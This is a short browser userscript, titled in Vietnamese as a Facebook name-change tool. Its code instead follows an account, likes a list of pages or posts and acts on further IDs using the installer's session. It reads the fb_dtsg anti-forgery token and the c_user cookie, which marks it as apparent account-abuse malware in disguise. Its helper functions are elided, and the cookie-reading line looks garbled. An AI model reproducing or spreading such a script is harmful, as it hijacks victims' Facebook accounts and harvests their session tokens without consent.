// ==UserScript==
// @name            Đổi tên lần 6 cho FACEBOOK (y) (O)
...
//Tuyet Bang Gia
a("100003725617149");
Like("420104851457032");Like("781796795183112");Like("302339106580327");
P("174517796015740");P("419803718153812");P("174517029349150");P("174518326015687");p("302689153211989");p("782256405137151");

var gid = ['259833360853367'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
